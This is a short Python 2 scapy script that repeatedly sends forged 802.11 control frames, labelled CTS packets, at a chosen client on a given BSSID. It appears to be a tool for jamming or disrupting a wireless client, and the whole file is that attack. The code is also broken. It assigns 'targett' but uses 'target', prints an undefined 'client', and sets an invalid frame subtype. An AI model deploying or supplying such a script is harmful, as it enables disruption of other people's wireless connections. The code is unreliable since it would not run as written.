import sys
if len(sys.argv) != 5:
	print 'arguments number wrong.......'
	sys.exit(1)

from scapy.all import *

conf.iface = sys.argv[1]
bssid = sys.argv[2]
targett = sys.argv[3]
count = sys.argv[4]

conf.verb = 0

packet = RadioTap()/Dot11(type=1,subtype=28,addr1=target,addr2=bssid,addr3=bssid)

for n in range(int(count)):
	sendp(packet)
	print 'CTS packet sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
